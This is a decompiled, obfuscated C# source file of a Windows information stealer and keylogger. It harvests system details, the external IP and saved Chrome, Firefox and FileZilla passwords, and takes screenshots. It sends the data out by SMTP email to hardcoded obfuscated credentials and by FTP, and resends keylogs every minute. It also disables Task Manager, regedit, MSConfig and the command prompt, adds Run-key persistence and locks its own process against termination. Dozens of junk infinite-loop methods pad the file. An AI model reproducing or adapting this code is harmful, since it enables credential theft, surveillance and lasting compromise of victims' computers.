using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using FhBgF;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using SUMlO;
using WiWUO;
using YPcnW;
using oEkqK;
using sqYNh;

namespace VlMMc;

public class dfMSl : ApplicationContext
{
	public enum lpEzj
	{
		AppData,
		System32,
		ProgramFiles,
		Temp,
		Local,
		MyDocuments
	}

	private const int KjjLT = 5;

	private const string gIcHf = "ejindhkg`oq;jpogjjf)^jh";

	private const int wXxJD = 60000;

	private const string VEbLV = "eji,-./0";

	public static Timer bXjzP = new Timer();

	public static CShDq WYhFz;

	public dfMSl(params string[] args)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			InitializeMutex("8.17813692557863E+16");
			WYhFz = new CShDq();
			new ComputerInfo();
			StringBuilder stringBuilder = new StringBuilder();
			new WebClient();
			stringBuilder.AppendLine(vCJaB.RotateRight("8888888888\u001b**\u001bU`mjGjbb`m\u001bw\u001bHjidojm\u001bw\u001bGjbn\u001bWW\u001b8888888888"));
			stringBuilder.AppendLine("Computer Name: " + Dns.GetHostName().ToString());
			stringBuilder.AppendLine("Username: " + Environment.UserName);
			stringBuilder.AppendLine("Country: " + RegionInfo.CurrentRegion.EnglishName.ToString());
			stringBuilder.AppendLine("System date and time: " + Conversions.ToString(DateTime.Now));
			stringBuilder.AppendLine("Processor: " + GetProcessor());
			stringBuilder.AppendLine("Framework: " + GetFramework());
			stringBuilder.AppendLine("Operating System: " + GetOS());
			stringBuilder.AppendLine("Anti-Virus: " + GetAntivirus());
			stringBuilder.AppendLine("Firewall: " + GetFirewall());
			stringBuilder.AppendLine(Conversions.ToString(Operators.ConcatenateObject((object)"External IP: ", GetIP())));
			stringBuilder.AppendLine(vCJaB.RotateRight("888888888888\u001b=mjrn`m\u001bM`^jq`mt\u001b888888888888"));
			stringBuilder.AppendLine(GetBrowsers());
			Upload(stringBuilder.ToString());
			bXjzP.add_Tick((EventHandler)SendLogs);
			bXjzP.set_Interval(60000);
			bXjzP.Start();
			WYhFz.SetStart();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Environment.Exit(1);
			ProjectData.ClearProjectError();
		}
	}

	private static void InitializeMutex(string Mutex)
	{
		new Mutex(initiallyOwned: false, Mutex);
	}

	public static void DisableCMD()
	{
		try
		{
			Registry.SetValue(vCJaB.RotateRight("CF@TZ>PMM@IOZPN@MWNjaor\\m`WKjgd^d`nWHd^mjnjaoWRdi_jrnWNtno`h"), NnKXl.B("xdDJhCZFxh83rtjcEMDUKg==", "heej"), "1", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void DisableTaskMan()
	{
		RegistryKey registryKey = Registry.CurrentUser;
		try
		{
			registryKey = registryKey.CreateSubKey(vCJaB.RotateRight("Njaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWKjgd^d`nWNtno`h"));
			registryKey.SetValue(NnKXl.B("O+hwgGRPoav0Qq4SRniagw==", "heej"), 1);
			registryKey.Close();
			registryKey = Registry.CurrentUser;
			registryKey = registryKey.OpenSubKey(vCJaB.RotateRight("Njaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWKjgd^d`nWNtno`h"));
			registryKey.SetValue(vCJaB.RotateRight("?dn\\]g`O\\nfHbm"), 1, RegistryValueKind.DWord);
			File.Delete(Path.Combine(Environment.SystemDirectory, vCJaB.RotateRight("o\\nfhbm)`s`")));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		finally
		{
			registryKey.Close();
		}
	}

	public static void DisableRegedit()
	{
		try
		{
			Registry.SetValue(vCJaB.RotateRight("CF@TZ>PMM@IOZPN@MWNjaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWKjgd^d`nWNtno`h"), NnKXl.B("X+bUeaqKr0TfIyZaL0lkwsIilFsbqxoo6UJ3EkP7s2U=", "heej"), "1", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void DisableMSConfig()
	{
		RegistryKey registryKey = Registry.CurrentUser;
		try
		{
			registryKey = registryKey.CreateSubKey(vCJaB.RotateRight("WNjaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWKjgd^d`nW@skgjm`mW?dn\\ggjrMpi"));
			registryKey = registryKey.OpenSubKey(vCJaB.RotateRight("WNjaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWKjgd^d`nW@skgjm`mW?dn\\ggjrMpi"));
			registryKey.SetValue(NnKXl.B("3iQb860DoSpt6blDzg346A==", "heej"), 1, RegistryValueKind.String);
			File.Delete(Path.Combine(Environment.SystemDirectory, NnKXl.B("0zesxg+ONq7ueqHHP04P4w==", "heej")));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		finally
		{
			registryKey.Close();
		}
	}

	public static object GetIP()
	{
		string text = "";
		using WebClient webClient = new WebClient();
		string text2 = webClient.DownloadString(NnKXl.B("UMIjco0HEsm28ESt9dnywycm4/9/oj+TJjivobHo8FU=", "heej"));
		return text + text2.ToString();
	}

	public static void SendLogs(object sender, EventArgs e)
	{
		try
		{
			if (Operators.CompareString(vCJaB.LGHFK.Trim(), "", false) != 0)
			{
				Upload(vCJaB.LGHFK);
				vCJaB.LGHFK = "";
			}
			else
			{
				vCJaB.LGHFK = vCJaB.RotateRight("V>JHKPO@M\u001b>PMM@IOGT\u001bD?G@?X\u001bV") + Conversions.ToString(DateTime.Now) + "]";
				Upload(vCJaB.LGHFK);
				vCJaB.LGHFK = "";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string GetBrowsers()
	{
		string newLine = Environment.NewLine;
		newLine = newLine + "===== Google Chrome Recovery =====" + Environment.NewLine;
		string chrome = lTVpS.GetChrome();
		newLine = newLine + chrome + Environment.NewLine;
		newLine = newLine + "===== Filezilla Recovery =====" + Environment.NewLine;
		string text = VctUT.FileZilla();
		newLine = newLine + text.ToString() + Environment.NewLine;
		newLine = newLine + "===== Mozilla Firefox Recovery =====" + Environment.NewLine;
		string mozillaFirefox = eULZj.GetMozillaFirefox();
		return newLine + mozillaFirefox + Environment.NewLine;
	}

	public static void Upload(string content)
	{
		try
		{
			ToStream(ScreenSave(), ImageFormat.get_Png());
			SmtpClient smtpClient = new SmtpClient();
			MailMessage mailMessage = new MailMessage();
			smtpClient.Credentials = new NetworkCredential(vCJaB.RotateRight("ejindhkg`oq;jpogjjf)^jh"), vCJaB.RotateRight("eji,-./0"));
			smtpClient.Port = 587;
			smtpClient.Host = "smtp.live.com";
			mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(vCJaB.RotateRight("ejindhkg`oq;jpogjjf)^jh"));
			mailMessage.To.Add(vCJaB.RotateRight("ejindhkg`oq;jpogjjf)^jh"));
			mailMessage.Subject = vCJaB.RotateRight("U`mj\u001bGjbb`m\u001b(\u001bTjp\u001bBjo\u001bGjbn\u001c\u001b(\u001bK>5") + " " + Environment.UserDomainName;
			mailMessage.Body = content;
			smtpClient.EnableSsl = true;
			smtpClient.Send(mailMessage);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object Rnd()
	{
		Random random = new Random();
		string empty = string.Empty;
		int num = 1;
		do
		{
			empty = Convert.ToString(random.Next(0, num));
			num += 2;
		}
		while (num <= 10000);
		return empty;
	}

	public static void FTPUpload(string content)
	{
		try
		{
			string text = Interaction.Environ(NnKXl.B("US5EdFyGp7B1YYEprI7+nA==", "heej"));
			FileStream fileStream = File.Create(text + NnKXl.B("tFMtZOYfDfYloaHp7HtHWQ==", "heej"));
			fileStream.Close();
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine(content);
			using (StreamWriter streamWriter = new StreamWriter(text + NnKXl.B("tFMtZOYfDfYloaHp7HtHWQ==", "heej")))
			{
				streamWriter.Write(stringBuilder.ToString());
			}
			FtpWebRequest ftpWebRequest = (FtpWebRequest)NewLateBinding.LateGet((object)null, typeof(WebRequest), "Create", new object[1] { Operators.AddObject(Operators.AddObject((object)vCJaB.RotateRight("[p35]"), Rnd()), (object)".txt") }, (string[])null, (Type[])null, (bool[])null);
			ftpWebRequest.Credentials = new NetworkCredential(vCJaB.RotateRight("[p36]"), vCJaB.RotateRight("[p37]"));
			ftpWebRequest.Method = "STOR";
			byte[] array = File.ReadAllBytes(text + NnKXl.B("tFMtZOYfDfYloaHp7HtHWQ==", "heej"));
			Stream requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(array, 0, array.Length);
			requestStream.Close();
			requestStream.Dispose();
			if (File.Exists(text + NnKXl.B("tFMtZOYfDfYloaHp7HtHWQ==", "heej")))
			{
				File.Delete(text + NnKXl.B("tFMtZOYfDfYloaHp7HtHWQ==", "heej"));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static Bitmap ScreenSave()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
		Bitmap val = new Bitmap(bounds.Width, bounds.Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		Size size = new Size(bounds.Width, bounds.Height);
		val2.CopyFromScreen(0, 0, 0, 0, size);
		val2.Dispose();
		return val;
	}

	public static Stream ToStream(Bitmap exoo, ImageFormat lop)
	{
		MemoryStream memoryStream = new MemoryStream();
		((Image)exoo).Save((Stream)memoryStream, lop);
		memoryStream.Position = 0L;
		return memoryStream;
	}

	public static void Install(lpEzj Path, string UserDefined = "NULL")
	{
		try
		{
			switch (Path)
			{
			case lpEzj.AppData:
				UserDefined = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				break;
			case lpEzj.System32:
				UserDefined = Environment.GetFolderPath(Environment.SpecialFolder.System);
				break;
			case lpEzj.ProgramFiles:
				UserDefined = Environment.GetFolderPath(Environment.SpecialFolder.Programs);
				break;
			case lpEzj.Temp:
				UserDefined = Environment.GetEnvironmentVariable(NnKXl.B("US5EdFyGp7B1YYEprI7+nA==", "heej"));
				break;
			case lpEzj.Local:
				UserDefined = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
				break;
			case lpEzj.MyDocuments:
				UserDefined = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
				break;
			}
			string path = UserDefined;
			UserDefined = System.IO.Path.Combine(UserDefined, System.IO.Path.GetFileName(Assembly.GetExecutingAssembly().Location));
			string empty = string.Empty;
			if (Operators.CompareString(UserDefined, Assembly.GetExecutingAssembly().Location, false) == 0)
			{
				return;
			}
			empty = Assembly.GetExecutingAssembly().Location;
			string[] commandLineArgs = Environment.GetCommandLineArgs();
			for (int i = 0; i < commandLineArgs.Length; i++)
			{
				string path2 = commandLineArgs[i];
				if (Operators.CompareString(path2, empty, false) != 0)
				{
					vCJaB.DeleteFileA(ref path2);
				}
			}
			empty = Assembly.GetExecutingAssembly().Location;
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			vCJaB.MoveFileEx(empty, UserDefined, 2);
			Process.Start(UserDefined, empty);
			ProjectData.EndApp();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void StartOnWindows(string location)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.OpenSubKey(vCJaB.RotateRight("Njaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWMpi"), writable: true);
			registryKey.SetValue("System32", location, RegistryValueKind.String);
			registryKey.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey localMachine = Registry.LocalMachine;
			RegistryKey registryKey2 = localMachine.OpenSubKey(vCJaB.RotateRight("Njaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWMpi"), writable: true);
			registryKey2.SetValue("System32", location, RegistryValueKind.String);
			registryKey2.Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.SetValue(vCJaB.RotateRight("CF@TZGJ><GZH<>CDI@WNJAOR<M@WHd^mjnjaoW<^odq`\u001bN`opkWDino\\gg`_\u001b>jhkji`ionW") + Guid.NewGuid(), NnKXl.B("D9KjAhX7posjtnm9eln2EQ==", "heej"), location, RegistryValueKind.String);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static void FakeMessageBox()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		MessageBoxIcon val = (MessageBoxIcon)0;
		string text = "[p16]";
		if (string.IsNullOrEmpty(text) | (Operators.CompareString(text, (string)null, false) == 0) | (Operators.CompareString(text, string.Empty, false) == 0))
		{
			text = " ";
		}
		MessageBox.Show(text, "[p18]", (MessageBoxButtons)0, val);
	}

	public static void ProtectProcess()
	{
		try
		{
			IntPtr currentProcess = vCJaB.GetCurrentProcess();
			RawSecurityDescriptor processSecurityDescriptor = vCJaB.GetProcessSecurityDescriptor(currentProcess);
			processSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			vCJaB.SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object GetInstalledPrograms()
	{
		string text = null;
		string name = vCJaB.RotateRight("Njaor\\m`WHd^mjnjaoWRdi_jrnW>pmm`ioQ`mndjiWPidino\\gg");
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
		string[] subKeyNames = registryKey.GetSubKeyNames();
		string[] array = subKeyNames;
		foreach (string name2 in array)
		{
			RegistryKey registryKey2 = registryKey.OpenSubKey(name2);
			string text2 = Conversions.ToString(registryKey2.GetValue(NnKXl.B("R2VYw9g+2cbcukF/AUackg==", "heej"), ""));
			if (Operators.CompareString(text2, "", false) != 0)
			{
				bool flag = true;
				if (text2.IndexOf("Hotfix") != -1)
				{
					flag = false;
				}
				if (text2.IndexOf("Security Update") != -1)
				{
					flag = false;
				}
				if (text2.IndexOf("Update for") != -1)
				{
					flag = false;
				}
				if (flag)
				{
					text = text + "[+] " + text2 + Environment.NewLine;
				}
			}
		}
		return text + Environment.NewLine;
	}

	public static string GetFramework()
	{
		string text = string.Empty;
		try
		{
			string name = vCJaB.RotateRight("NJAOR<M@WHd^mjnjaoW<^odq`\u001bN`opkWDino\\gg`_\u001b>jhkji`ion");
			string empty = string.Empty;
			string empty2 = string.Empty;
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
			string[] subKeyNames = registryKey.GetSubKeyNames();
			string[] array = subKeyNames;
			foreach (string name2 in array)
			{
				RegistryKey registryKey2 = registryKey.OpenSubKey(name2);
				empty2 = (string)registryKey2.GetValue(null);
				if (empty2 != null && empty2.IndexOf(".NET Framework") >= 0)
				{
					empty = (string)registryKey2.GetValue("Version");
					if (!text.Contains(Conversions.ToString(empty[0])))
					{
						text = text + Conversions.ToString(empty[0]) + ", ";
					}
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Unknown";
			ProjectData.ClearProjectError();
			return result;
		}
		return text.Remove(text.Length - 2);
	}

	public static string GetProcessor()
	{
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject(NnKXl.B("1GxDFmLRXQvbscyV1q50Hw==", "heej"), (string)null));
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)NewLateBinding.LateGet(objectValue, (Type)null, "InstancesOf", new object[1] { "Win32_Processor" }, (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
				if (enumerator.MoveNext())
				{
					object objectValue2 = RuntimeHelpers.GetObjectValue(enumerator.Current);
					return Conversions.ToString(NewLateBinding.LateGet(objectValue2, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return NnKXl.B("4HA7QDWv7sDJ6Oi89CSKzITSzlfRoZtMMoXQ2uksHgo=", "heej");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = NnKXl.B("pbp+qB1zR4tMahSGt9tmo8e2pFW3WyvmrIEe/WFzaRs=", "heej");
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string GetOS()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		string[] array = new string[0];
		object obj = (object)new ManagementObjectSearcher(vCJaB.RotateRight("N@G@>O\u001b%\u001bAMJH\u001bRdi.-ZJk`m\\odibNtno`h"));
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)NewLateBinding.LateGet(obj, (Type)null, "Get", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
			while (enumerator.MoveNext())
			{
				object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
				array = NewLateBinding.LateIndexGet(objectValue, new object[1] { "name" }, (string[])null).ToString()!.Split(new char[1] { '|' });
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		return Conversions.ToString(Interaction.IIf(array[0] != null, (object)array[0], (object)"Unknown"));
	}

	public static string GetFirewall()
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		string result = "None";
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + vCJaB.RotateRight("WmjjoWN`^pmdot>`io`m-"), vCJaB.RotateRight("N@G@>O\u001b%\u001bAMJH\u001bAdm`r\\ggKmj_p^o"));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val3).get_Item(NnKXl.B("s0uVUeAE0NKnal77iFrgyw==", "heej")).ToString();
				}
				return result;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string GetAntivirus()
	{
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Expected O, but got Unknown
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			string machineName = Environment.MachineName;
			string text2 = Conversions.ToString(Interaction.IIf(Environment.OSVersion.Version.Major > 5, (object)("\\\\" + machineName + vCJaB.RotateRight("WmjjoWN`^pmdot>`io`m-")), (object)("\\\\" + machineName + vCJaB.RotateRight("WmjjoWN`^pmdot>`io`m"))));
			ManagementObjectSearcher val = new ManagementObjectSearcher(text2, vCJaB.RotateRight("N@G@>O\u001b%\u001bAMJH\u001b<iodqdmpnKmj_p^o"));
			ManagementObjectCollection val2 = val.Get();
			string text3 = vCJaB.RotateRight("<iodqdmpn`n\u001b#") + val2.get_Count() + "):\r\n";
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					try
					{
						text3 = Conversions.ToString(Operators.AddObject((object)text3, ((ManagementBaseObject)val3).get_Item(vCJaB.RotateRight(NnKXl.B("N+nmBc8WDZHU2XBQ2RDyEg==", "heej")) + " - ")));
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					try
					{
						text3 = Conversions.ToString(Operators.ConcatenateObject((object)text3, Operators.ConcatenateObject(Operators.ConcatenateObject(((ManagementBaseObject)val3).get_Item("displayName"), (object)"\r"), (object)"\n")));
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			text = text3;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		if (text.Contains(":"))
		{
			text = text.Split(new char[1] { ':' })[1].TrimStart(new char[0]).TrimEnd(new char[0]);
		}
		return text;
	}

	static void tiOKK()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void usaPj()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void GYkYW()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void gNqGm()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void Qgkme()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void NoLXl()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void PadsO()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void zFpjq()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void txMWq()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wPMiF()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void afndJ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void kzscK()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void mSpIh()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void irPKn()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void nOOdT()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void XLLmu()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wCyKb()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void kljoZ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void fzqhv()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void omgyv()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void WpJcX()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void DuUjb()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void aDjBn()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void JeSby()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void zHkxw()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void YHVuu()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void lVflh()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void tZUVT()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void saPja()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void YkYWQ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void NqGms()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void gkmeE()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void oLXlT()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void adsOP()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void FpjqU()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void xMWqF()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void PMiFd()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void fndJR()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void NGqYa()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void fEVvW()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void GdYCE()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void cbrhk()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void YYzJV()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void QMYop()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void yxDng()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void OEuJT()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ztMJg()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void DXqka()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void JhwpZ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void QxPBF()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void sfpNI()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void UyMLb()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ViIIj()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void itzvH()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void miigl()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void odxne()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void xmjdv()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void iXDyy()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void EuJTC()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void agcor()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void wEivu()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void TpoQx()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void pNIlm()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void ZxNGq()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void vWhbt()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void SHmii()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void nesDl()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void KQMYo()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void gnSse()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void DZlzh()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void mwrUk()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void JhwpZ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void fFQKc()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void BqWfg()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void XcpmV()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void tzvHY()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void dkCcb()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void zJVwR()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void WtaEU()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}

	static void sRuZJ()
	{
		//Discarded unreachable code: IL_0005
		while (true)
		{
		}
	}
}
